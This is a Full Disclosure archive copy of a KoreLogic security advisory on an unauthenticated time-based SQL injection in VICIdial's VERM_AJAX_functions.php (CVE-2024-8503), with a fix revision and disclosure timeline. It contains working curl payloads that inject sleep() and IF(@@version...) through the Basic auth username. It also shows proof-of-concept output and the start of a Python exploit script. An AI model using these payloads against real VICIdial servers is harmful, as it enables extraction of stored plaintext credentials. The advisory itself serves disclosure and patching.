---
title: KL-001-2024-011: VICIdial Unauthenticated SQL Injection
url: https://seclists.org/fulldisclosure/2024/Sep/25
source: Full Disclosure
date: 2024-09-11
fetch_date: 2025-10-06T18:30:33.441039
---

# KL-001-2024-011: VICIdial Unauthenticated SQL Injection

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](24)
[By Date](date.html#25)
[![Next](/images/right-icon-16x16.png)](26)

[![Previous](/images/left-icon-16x16.png)](24)
[By Thread](index.html#25)
[![Next](/images/right-icon-16x16.png)](26)

![](/shared/images/nst-icons.svg#search)

# KL-001-2024-011: VICIdial Unauthenticated SQL Injection

---

*From*: KoreLogic Disclosures via Fulldisclosure <fulldisclosure () seclists org>
*Date*: Tue, 10 Sep 2024 14:28:59 -0500

---

```
KL-001-2024-011: VICIdial Unauthenticated SQL Injection

Title: VICIdial Unauthenticated SQL Injection
Advisory ID: KL-001-2024-011
Publication Date: 2024-09-10
Publication URL: https://korelogic.com/Resources/Advisories/KL-001-2024-011.txt

1. Vulnerability Details

     Affected Vendor: VICIdial
     Affected Product: VICIdial
     Affected Version: 2.14-917a
     Platform: GNU/Linux
     CWE Classification: CWE-89: Improper Neutralization of Special
                         Elements used in an SQL Command
                         ('SQL Injection')
     CVE ID: CVE-2024-8503

2. Vulnerability Description

     An unauthenticated attacker can leverage a time-based SQL
     injection vulnerability in VICIdial to enumerate database
     records. By default, VICIdial stores plaintext credentials
     within the database.

3. Technical Description

     VICIdial is an open-source contact center suite, mainly used
     by call centers. The "vicidial.com" website boasts over 14,000
     registered installations. There is a public SVN repository to
     access the source code, as well as an ISO that can be used to
     install the software. The ISO was used in a virtual machine
     for testing purposes.

     When performing SQL queries, VICIdial does not use prepared
     statements, but instead uses the "preg_replace" PHP function
     to remove problematic characters in user-controlled input
     before interpolating the variable into a SQL query. This
     is largely an effective solution, as regular expressions
     like "/[^-_0-9a-zA-Z]/" are passed to "preg_replace", which
     essentially limits input to the characters shown in the pattern
     (letters, numbers, underscores, and hyphens).

     However, these scripts do not utilize a shared PHP file
     for performing sanitization uniformly. Instead, each script
     individually implements the "preg_replace" function, leading
     to inconsistencies in which patterns are used and where they
     are applied.

     For example, providing credentials via the "Authorization"
     request header using the "Basic" scheme, most PHP scripts
     sanitize the username value with the following line:

    $PHP_AUTH_USER = preg_replace('/[^-_0-9a-zA-Z]/','',$PHP_AUTH_USER);

     However, the "VERM_AJAX_functions.php" PHP script does not
     perform any sanitization before inserting the username into
     a SQL "INSERT" statement:

    $PHP_AUTH_USER=$_SERVER['PHP_AUTH_USER'];
    $PHP_AUTH_PW=$_SERVER['PHP_AUTH_PW'];
    ...
    if ($function=="log_custom_report")
      {
      $rpt_log_stmt="insert ignore into
        verm_custom_report_holder(user,
        report_name, report_parameters)
        values('$PHP_AUTH_USER', '$custom_report_name',
        '$LOGhttp_referer') ON DUPLICATE KEY
        UPDATE report_name='$custom_report_name',
        report_parameters='$custom_report_vars'";
      $rpt_log_rslt=mysql_to_mysqli($rpt_log_stmt, $link);
      return mysqli_affected_rows($rpt_log_rslt);
      }

     Since "VERM_AJAX_functions.php" can be accessed without
     authentication, this creates a straight forward unauthenticated
     SQL injection vulnerability. While the page response cannot
     be manipulated by the execution of the query, delays in the
     page response can be observed when using SQL functions such as
     "sleep()", enabling the enumeration of database values using
     time-based SQL injection:

    $ time curl -u "foo:bar" \
 http://REDACTED/VERM/VERM_AJAX_functions.php?function=log_custom_report

    real    0m0.019s   <--- (normal response time)
    user    0m0.004s
    sys    0m0.008s

    $ time curl -u "','',sleep(5));#:bar" \
 http://REDACTED/VERM/VERM_AJAX_functions.php?function=log_custom_report

    real    0m5.023s   <--- (5-second delay in response time)
    user    0m0.003s
    sys    0m0.008s

     This observable difference can be used to craft queries that
     sleep under specific conditions, allowing an attacker to ask
     "Yes or No" questions. In the following example, the "sleep()"
     function is called only if the provided string matches the
     database version:

    $ time curl -u \
        "','',IF(@@version='korelogic',sleep(5),NULL));#:bar" \
 http://vicidial.zz/VERM/VERM_AJAX_functions.php?function=log_custom_report

    real    0m0.024s   <--- (normal response time)
    user    0m0.006s
    sys    0m0.003s

    $ time curl -u \
 "','',IF(@@version='10.6.14-MariaDB-log',sleep(5),NULL));#:bar" \
 http://vicidial.zz/VERM/VERM_AJAX_functions.php?function=log_custom_report

    real    0m5.019s   <--- (5-second delay in response time)
    user    0m0.004s
    sys    0m0.008s

4. Mitigation and Remediation Recommendation

     This issue has been remediated in the public svn/trunk codebase,
     as of revision 3848 committed 2024-07-08.

5. Credit

     This vulnerability was discovered by Jaggar Henry of KoreLogic,
     Inc.

6. Disclosure Timeline

     2024-07-05 : KoreLogic requests security contact from
                  support () vicidial com.
     2024-07-08 : KoreLogic reports vulnerability details to VICIdial
                  contact.
     2024-07-08 : VICIdial notifies KoreLogic that the issue has been
                  remediated with revision 3848 in the public
                  Subversion repository.
     2024-07-11 : KoreLogic confirms this vulnerability has been
                  remediated. KoreLogic asks VICIdial if it is
                  appropriate to publicly disclose the vulnerability
                  details at this time.
     2024-07-11 : VICIdial requests four weeks of embargo in order to
                  upgrade supported customers.
     2024-08-05 : KoreLogic asks VICIdial if it is appropriate to
                  publicly disclose the vulnerability details at
                  this time.
     2024-08-09 : VICIdial requests an additional two weeks of
                  embargo.
     2024-09-10 : KoreLogic public disclosure.

7. Proof of Concept

     The following script can be used to automate the exploitation process and
     enumerate the results of provided queries:

         $ time python unauth_sqli.py -rh vicidial.zz -rp 443 -q 'SELECT @@version'
         [+] Target appears vulnerable to time-based SQL injection
         [~] Executing SQL: SELECT @@version
         [~] 1
         [~] 10
         [~] 10.
         [~] 10.6
         [~] 10.6.
         [~] 10.6.1
         [~] 10.6.14
         [~] 10.6.14-
         [~] 10.6.14-M
         [~] 10.6.14-Ma
         [~] 10.6.14-Mar
         [~] 10.6.14-Mari
         [~] 10.6.14-Maria
         [~] 10.6.14-MariaD
         [~] 10.6.14-MariaDB
         [~] 10.6.14-MariaDB-
         [~] 10.6.14-MariaDB-l
         [~] 10.6.14-MariaDB-lo
         [~] 10.6.14-MariaDB-log

         real    0m6.727s
         user    0m0.425s
         sys    0m0.020s

     ##############################
     ##      unauth_sqli.py      ##
     ##############################

     import string
     import random
     import urllib3
     import argparse
   ...